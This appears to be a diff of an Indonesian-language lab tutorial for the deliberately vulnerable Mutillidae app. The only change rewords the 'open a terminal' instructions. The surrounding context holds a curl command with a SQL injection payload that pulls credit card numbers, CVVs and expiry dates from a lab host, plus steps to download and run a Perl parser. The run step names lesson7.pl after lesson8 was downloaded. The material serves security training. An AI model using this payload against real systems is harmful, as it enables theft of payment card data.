@@ -117,7 +117,7 @@
    ```
 
 ## Perl Parser
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
    ```
    cd /root
    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username="  > lesson8.txt
@@ -125,7 +125,7 @@
    ```
 
 ## Download Parser
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
    ```
    cd /root
    wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT
@@ -134,7 +134,7 @@
    ```
 
 ## Run Perl Script
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
    ```
    ./lesson7.pl
    ```
